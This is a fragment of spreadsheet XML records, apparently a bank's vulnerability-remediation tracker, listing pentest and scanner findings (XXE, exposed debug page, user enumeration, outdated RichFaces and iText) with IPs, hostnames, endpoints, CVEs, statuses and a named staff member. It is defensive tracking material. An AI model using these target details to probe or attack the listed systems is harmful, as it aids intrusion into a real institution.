    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="38"/>
    <s v="CWE-668: Exposure of Resource to Wrong Sphere"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="94188208248"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26T00:00:00"/>
    <s v="El Equipo estableció que la aplicación web podía incorporarse a sitios web de terceros utilizando iFrames."/>
    <s v="Cisco recomienda que, en los casos en que la aplicación necesite ser incorporada en una aplicación de terceros, el servidor web se reconfigure de manera que las respuestas incluyan el siguiente encabezado personalizado, que indique a los navegadores modernos que la representación de la página dentro de un iFrame está prohibida, o que sólo se acepta de los dominios especificados:_x000a_X-Frame-Options: Deny _x000a_X-Frame-Options: Allow-From https://some.othersite.com_x000a_Alternativamente, Cisco recomienda utilizar el JavaScript para evitar que la aplicación se incruste en otra página web._x000a_Nota: Aunque el encabezado 'X-Frame-Options' es soportado por los principales navegadores, nunca fue estandarizado y ha sido desaprobado en favor de la directiva 'frame-ancestors' de la especificación CSP Nivel 2. Sin embargo, se recomienda que el encabezado 'X-Frame-Options' actualmente soportado y la recién introducida directiva 'frame-ancestor' se utilicen para garantizar la protección contra todas las amenazas conocidas en todos los escenarios."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="86"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200612_N_09"/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="39"/>
    <s v="CWE-201: Information Exposure Through Sent Data"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 12/06/2020"/>
    <s v="1ª Fecha: 13/11/2020"/>
    <d v="2021-03-05T00:00:00"/>
    <s v="La aplicación contiene el siguiente enlace a otro dominio desde URL que contienen una línea de consulta: _x000a_- https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js _x000a_- https://analytics.twitter.com/i/adsct?txn_id=nuum1&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_qua ntity=0 _x000a_- https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800 _x000a_- https://platform.twitter.com/oct.js - https://sb.scorecardresearch.com/c2/16058935/cs.js _x000a_- https://sb.scorecardresearch.com/p?c1=2&amp;c2=16058935&amp;ns_site=santanderadvance&amp;name=&amp;ns_categor y=banco _x000a_- https://t.co/i/adsct?txn_id=nuum1&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_quantity=0 _x000a_- https://www.facebook.com/tr?id=1685728391672672&amp;ev=PageView&amp;noscript=1 _x000a_- https://www.fogafin.gov.co/ _x000a_- https://www.googletagmanager.com/ns.html?id=GTM-WNBLPF _x000a_- https://www.youtube.com/iframe_api _x000a_- https://www.youtube.com/player_api _x000a_- https://www.images-home.com/image.js"/>
    <s v="Cisco recomienda verificar la información revelada a todos los terceros y evitar compartir esa información a menos que sea un requisito comercial."/>
    <m/>
    <d v="2020-11-13T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="87"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200717_N"/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="40"/>
    <s v="CWE-138: Improper Neutralization of Special Elements"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha 17/07/2020"/>
    <s v="1ª Fecha: 09/09/2020"/>
    <d v="2020-10-09T00:00:00"/>
    <s v="El Equipo descubrió que los archivos PDF se mostraban en el navegador, lo que exponía potencialmente a los usuarios a múltiples vulnerabilidades relacionadas de forma innecesaria._x000a_Algunos archivos de ejemplo:_x000a_https://www.santander.com.co/recursos/archivos/aceptacion-condiciones.pdf _x000a_https://www.santander.com.co/recursos/archivos/aviso-de-privacidad.pdf _x000a_https://www.santander.com.co/recursos/archivos/bsnc-certificaciones-eeff-2018.pdf _x000a_https://www.santander.com.co/recursos/archivos/bsnc-eeff-auditados-2018-2017.pdf _x000a_https://www.santander.com.co/recursos/archivos/bsnc-eeff-y-notas-marzo-19.pdf _x000a_https://www.santander.com.co/recursos/archivos/bsnc-informe-de-gestion-2018.pdf _x000a_https://www.santander.com.co/recursos/archivos/bsnc-sfc-2013.pdf _x000a_https://www.santander.com.co/recursos/archivos/canales-atencion-amv.pdf_x000a_[TRUCATED]"/>
    <s v="Cisco recomienda que se modifique la forma en que se accede a los documentos PDF para que los usuarios se vean obligados a descargar los documentos PDF en lugar de abrirlos en su navegador. Esto puede lograrse añadiendo un encabezado de Disposición de Contenido a una solicitud de un documento PDF con el tipo establecido en &quot;adjunto&quot;_x000a_disposición de contenido: adjunto;_x000a_Nota: En el sitio web de Adobe se pueden encontrar más consejos sobre cómo añadir un encabezado de Disposición de contenido, así como información sobre la propia vulnerabilidad._x000a_"/>
    <m/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="88"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="N/A"/>
    <m/>
    <m/>
    <x v="41"/>
    <s v="CWE-319: Transmission of Sensitive Information In Plain Text"/>
    <s v="N/A"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <n v="46196"/>
    <d v="1900-04-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <s v="N/A"/>
    <s v="The Team discovered that sensitive content was transmitted over the plain text protocol HTTP."/>
    <s v="Cisco recommends that the web application is reconfigured to run over an encrypted protocol such as HTTPS, which should be configured to use trusted certificates and the strongest cipher suites supported by the intended client base. It is important to ensure that no content within the application is accessed via HTTP, as an attacker could exploit this to inject code that would disclose any sensitive content on the affected pages."/>
    <m/>
    <m/>
    <s v="Esta vulnerabilidad no se encuentra presente en ningun activo que pertenezca a BSNC"/>
    <m/>
  </r>
  <r>
    <n v="89"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-006"/>
    <m/>
    <s v="Web de Proveedores"/>
    <m/>
    <m/>
    <x v="42"/>
    <s v="CWE-673: External Influence of Sphere Definition"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="El Equipo observó que el servidor web no daba instrucciones al navegador del usuario para que restringiera las fuentes desde las que se permitía cargar los activos (por ejemplo, scripts, estilos, imágenes o marcos)._x000a_No se devolvió un encabezamiento HTTP similar al siguiente en respuesta a las solicitudes._x000a_Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'"/>
    <s v="Cisco recomienda que se utilice la función de Política de Seguridad de Contenidos (CSP) para mejorar la resistencia a los ataques de Cross-site Scripting, prohibiendo el uso de scripts y estilos en línea y limitando las fuentes de activos permitidos a las ubicaciones de confianza. Cuando se implementa correctamente, CSP puede mitigar todos los ataques de Cross-site Scripting, excepto los más sofisticados._x000a_Nota: Para una protección efectiva, no se deben utilizar scripts o estilos en línea en las páginas, y en su lugar se deben mover a sus propios archivos."/>
    <s v="Plantean riesgos de seguridad para los usuarios de Internet y los gestores de páginas web y pueden manipularse, por ejemplo, mediante el Cross Site Scripting. "/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="90"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="42"/>
    <s v="CWE-673: External Influence of Sphere Definition"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team observed that the web server did not instruct the user's browser to restrict the sources from which assets (for example, scripts, styles, images or frames) were allowed to be loaded._x000a_An HTTP header similar to the following was not returned in response to requests:_x000a_Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'"/>
    <s v="Cisco recommends that the Content Security Policy (CSP) feature be used to improve resistance to Cross-site Scripting attacks by banning the use of inline scripts and styles, and limiting allowed asset sources to trusted locations. When implemented correctly, CSP can mitigate all but the most sophisticated Cross-site Scripting attacks._x000a_Note: For effective protection, no inline scripts or styles should be used in pages, and should instead be moved to their own files."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="91"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="42"/>
    <s v="CWE-673: External Influence of Sphere Definition"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <n v="94188208248"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team observed that the web server did not instruct the user's browser to restrict the sources from which assets (for example, scripts, styles, images or frames) were allowed to be loaded._x000a_An HTTP header similar to the following was not returned in response to requests:_x000a_Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'"/>
    <s v="Cisco recommends that the Content Security Policy (CSP) feature be used to improve resistance to Cross-site Scripting attacks by banning the use of inline scripts and styles, and limiting allowed asset sources to trusted locations. When implemented correctly, CSP can mitigate all but the most sophisticated Cross-site Scripting attacks._x000a_Note: For effective protection, no inline scripts or styles should be used in pages, and should instead be moved to their own files."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="92"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="42"/>
    <s v="CWE-673: External Influence of Sphere Definition"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team observed that the web server did not instruct the user's browser to restrict the sources from which assets (for example, scripts, styles, images or frames) were allowed to be loaded._x000a_An HTTP header similar to the following was not returned in response to requests:_x000a_Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'"/>
    <s v="Cisco recommends that the Content Security Policy (CSP) feature be used to improve resistance to Cross-site Scripting attacks by banning the use of inline scripts and styles, and limiting allowed asset sources to trusted locations. When implemented correctly, CSP can mitigate all but the most sophisticated Cross-site Scripting attacks._x000a_Note: For effective protection, no inline scripts or styles should be used in pages, and should instead be moved to their own files."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="93"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="43"/>
    <s v="CWE-200: Information Exposure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26T00:00:00"/>
    <s v="El Equipo descubrió que el archivo '/robots.txt' contenía directorios utilizados para controlar los robots de los motores de búsqueda que rastrean los sitios web en busca de información._x000a_El contenido de robots.txt : : _x000a_User-agent: * _x000a_Disallow: /*?* _x000a_Sitemap: https://es.santanderadvance.com/sitemaps/sitemap.xml_x000a_https://www.santander.com.co/robots.txt"/>
    <s v="Cisco recomienda que '/robots.txt' sea eliminado a menos que sea absolutamente necesario. Cabe señalar que los motores de búsqueda sólo seguirán los enlaces accesibles, por lo que un método válido para evitar que se indexen las zonas sensibles del sitio es simplemente no incluir los URL sensibles en ninguna de las páginas con enlaces públicos. Si la información presentada por la aplicación no está destinada al consumo público, también es posible sustituir el contenido de '/robots.txt' por el texto que figura a continuación, lo que impedirá que los robots de los motores de búsqueda indexen cualquier contenido de la página:_x000a_User-agent: * _x000a_Disallow: *_x000a_Alternativamente, el archivo '/robots.txt' puede ser reemplazado usando el encabezado X-Robots-Tag Header. En el directorio que no debe ser indexado por los motores de búsqueda, cree un archivo .htaccess e introduzca lo siguiente en él:_x000a_Header set X-Robots-Tag &quot;noindex, nofollow&quot;"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="94"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-007"/>
    <m/>
    <s v="Web de Proveedores"/>
    <m/>
    <m/>
    <x v="44"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <d v="2020-07-13T00:00:00"/>
    <s v="El Equipo observó que el servidor web no daba instrucciones al navegador del usuario para que no adivinara el tipo de MIME de un archivo por medio del &quot;content sniffing&quot;._x000a_Una cabecera HTTP similar a la siguiente no se devolvía en respuesta a las solicitudes::_x000a_X-Content-Type-Options: nosniff"/>
    <s v="Cisco recomienda que el servidor web esté configurado para añadir el siguiente encabezado HTTP &quot;X-Content-Type-Options&quot;:_x000a_X-Content-Type-Options: nosniff"/>
    <s v="se produzca un ataque basado en confusión de tipos mime."/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="95"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="44"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="80"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team observed that the web server did not instruct the user's browser not to guess the MIME type of a file via content sniffing._x000a_An HTTP header similar to the following was not returned in response to requests:_x000a_X-Content-Type-Options: nosniff"/>
    <s v="Cisco recommends that the web server is configured to add the following ‘X-Content-Type-Options’ HTTP header:_x000a_X-Content-Type-Options: nosniff"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="96"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="44"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team observed that the web server did not instruct the user's browser not to guess the MIME type of a file via content sniffing._x000a_An HTTP header similar to the following was not returned in response to requests:_x000a_X-Content-Type-Options: nosniff"/>
    <s v="Cisco recommends that the web server is configured to add the following ‘X-Content-Type-Options’ HTTP header:_x000a_X-Content-Type-Options: nosniff"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="97"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="45"/>
    <s v="CWE-693: Protection Mechanism Failure"/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-04-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="No X-XSS-Protection header was set in the response."/>
    <s v="Cisco recommends that the web server is configured to add the ‘X-XSS-Protection’ HTTP header as follows:_x000a_X-XSS-Protection: 1; mode=block"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="98"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="bsncp201bck.cosan.corp"/>
    <s v="QA-18026094337"/>
    <m/>
    <x v="46"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <s v="Vendor"/>
    <s v="CVE-2019-0232"/>
    <s v="180.26.138.201"/>
    <s v="bsncp201bck.cosan.corp"/>
    <m/>
    <m/>
    <d v="2020-02-05T00:00:00"/>
    <n v="2330"/>
    <d v="2020-02-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-01T00:00:00"/>
    <m/>
    <s v="El proveedor ha publicado las siguientes correcciones de seguridad relacionadas con esta vulnerabilidad:_x000a_- Apache Tomcat 9.0.18 o posterior_x000a_- Apache Tomcat 8.5.40 o posterior_x000a_- Apache Tomcat 7.0.93 o posterior_x000a_Se puede encontrar más información en Tomcat"/>
    <s v="Cuando se ejecuta en Windows con enableCmdLineArguments habilitado, el Servlet CGI en Apache Tomcat 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39 y 7.0.0 a 7.0.93 es vulnerable a la ejecución remota de código debido a un error en la forma en que el JRE pasa los argumentos de la línea de comandos a W"/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="99"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterblizzard-4"/>
    <m/>
    <x v="47"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="Vendor"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-03-06T00:00:00"/>
    <n v="2300"/>
    <d v="2020-06-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-03-01T00:00:00"/>
    <s v="XXE en https://141.226.106.45/factoringWSOccidente-factoringWSOccidente/ConsultarProductoOcciclienteServiceAction: # Descripción del problema:_x000a__x000a_- XXE en la aplicación https://141.226.106.45/f usando la API de SOAP, que se confirmó usando un requerimiento de DNS ciego_x000a_"/>
    <s v="Análisis correcto del XML en la API SOAP."/>
    <s v="Enumeración de archivos verificando si la aplicación tiene errores o no_x000a_Posible exfiltración (sin el firewall)"/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="100"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-1701704568"/>
    <m/>
    <x v="48"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="Vendor"/>
    <s v="CVE-2019-11358"/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2020-03-31T00:00:00"/>
    <n v="2275"/>
    <d v="2020-06-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-10-09T00:00:00"/>
    <m/>
    <s v="El vendedor ha recomendado actualizar jquery a la versión 3.4.0_x000a_&lt;P&gt; Parche: &lt;BR&gt;_x000a_Los siguientes son enlaces para descargar parches para corregir las vulnerabilidades:_x000a_&lt;P&gt; &lt;A HREF=&quot;https://jquery.com/download/&quot; TARGET=&quot;_blank&quot;&gt; jQuery &lt;/A&gt;"/>
    <s v="Un atacante puede aprovechar este problema para ejecutar código de script arbitrario en el navegador de un usuario desprevenido en el contexto del sitio afectado. Esto puede permitir al atacante robar credenciales de autenticación basadas en cookies y lanzar otros ataques."/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Despedida"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="101"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_R"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_01"/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b3582c9b"/>
    <s v="CO-20-CNMPO-004-AP-001"/>
    <x v="49"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="3.7"/>
    <s v="CVE-2018-14667_x000a_CVE-2018-12533_x000a_CVE-2013-2165"/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2020-06-02T00:00:00"/>
    <n v="2212"/>
    <d v="2020-09-30T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/07/2020_x000a_2ª Fecha: 18/12/2020"/>
    <s v="1ª Fecha: 18/12/2020_x000a_2ª Fecha: 18/12/2021"/>
    <d v="2022-08-11T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha identificado que la aplicación web utiliza el framework Richfaces con una versión vulnerable."/>
    <s v="Se recomienda cambiar de framework a uno que mantenga el soporte de los desarrolladores."/>
    <s v="Los CVEs asociados a la versión de Richfaces identificada, permiten la ejecución de código remoto mediante vulnerabilidades de deserialización e inyección de código EL. Un atacante podría aprovecharse de estas vulnerabilidades para conseguir acceso total al servidor. Además, la Richfaces ya no tiene soporte por los desarrolladores oficiales. Por lo tanto, las nuevas vulnerabilidades que se encuentren en el framework no serán corregidas."/>
    <s v="2/05/2022_x000a_29/01/2021"/>
    <s v="Gestores: BOT envió propuesta que hizo el equipo de Heinsohn sobre actualización del Front para dar solución a la vulnerabilidad con un tiempo de atención de 18 meses, BOT manifiesta que Heinsohn tiene una propuesta para dar solución a la vulnerabilidad dentro de dos meses (Enero) mientras se trabaja este desarrollo. Se debe concertar reunión con el equipo de CiberSeguridad para plantear esta opción._x000a_Pendiente fecha de compromiso. _x000a_21 de febrero ambiente previo  "/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="102"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200728_N_02"/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b3582c9c"/>
    <s v="CO-20-CNMPO-004-AP-002"/>
    <x v="50"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="8.3000000000000007"/>
    <s v="CVE-2017-9096"/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2020-06-02T00:00:00"/>
    <n v="2212"/>
    <d v="2020-06-12T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 28/12/2020"/>
    <s v="1ª Fecha: 18/12/2020"/>
    <d v="2021-02-08T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha identificado que en el servidor se está utilizando la versión 2.1.2 de la librería iText._x000a_Se muestran los metadatos de uno de los ficheros descargables de la aplicación web."/>
    <s v="Se recomienda actualizar la versión de la librería iText a la más actual que esté disponible."/>
    <s v="Un atacante puede analizar el resto de la aplicación para identificar alguna funcionalidad que permita interactuar con la librería para explotar la vulnerabilidad pública CVE-2017-9096, causando una inyección de código XML y causando una ejecución de código remoto."/>
    <d v="2021-01-23T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="103"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b3582c9d"/>
    <s v="CO-20-CNMPO-004-AP-003"/>
    <x v="51"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2020-06-02T00:00:00"/>
    <n v="2212"/>
    <d v="2020-08-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-10T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha identificado que el aplicativo web tiene habilitado el acceso a la página de debug. Esta página contiene información sobre los componentes que forman la aplicación web. Además, se ha identificado nombres de usuario y la clave de cifrado de jCryption._x000a_La página de debug se encuentra en:_x000a_• https://confirming-factoring.santander.com.co/factoring/common/mainPages/debug.seam"/>
    <s v="Se recomienda deshabilitar el acceso a la página de debug. Si fuera necesario el acceso por parte de algunos usuarios, se recomienda únicamente permitir el acceso a los usuarios autenticados y con permisos específicos."/>
    <s v="Un atacante puede utilizar la información expuesta para realizar ataques más específicos y buscar nuevos vectores de ataque. Por ejemplo, se podría descifrar la información cifrada con la clave jCryption, realizar ataques de fuerza bruta sobre los usuarios descubiertos y ataques de password spraying."/>
    <d v="2020-08-03T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="104"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b3582c9e"/>
    <s v="CO-20-CNMPO-004-AP-004"/>
    <x v="52"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2020-06-02T00:00:00"/>
    <n v="2212"/>
    <d v="2020-09-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-10T00:00:00"/>
    <s v="Durante las pruebas realizadas a la página de Login, se ha identificado diferentes tipos de error en función de sí el usuario existe o no existe._x000a_Es posible obtener los usuarios registrados en la aplicación web en base a los diferentes errores que muestra el aplicativo. Estos errores son diferentes en función de si el usuario introducido es válido o no."/>
    <s v="Un atacante puede obtener un listado de los usuarios de la aplicación con el objetivo de utilizar dicha información para planificar y generar ataques de mayor impacto. Como por ejemplo ataques de fuerza bruta sobre usuarios existentes para descubrir las contraseñas o ataques de password spraying."/>
    <s v="Se recomienda modificar los mensajes de error presentados al usuario para que no proporcionen información sobre la existencia del usuario. Un posible mensaje podría ser &quot;El usuario y/o la contraseña introducidos no son válidos&quot; tanto para usuarios incorrectos como para contraseñas incorrectas."/>
    <d v="2020-08-03T00:00:00"/>
    <s v="Certificada"/>
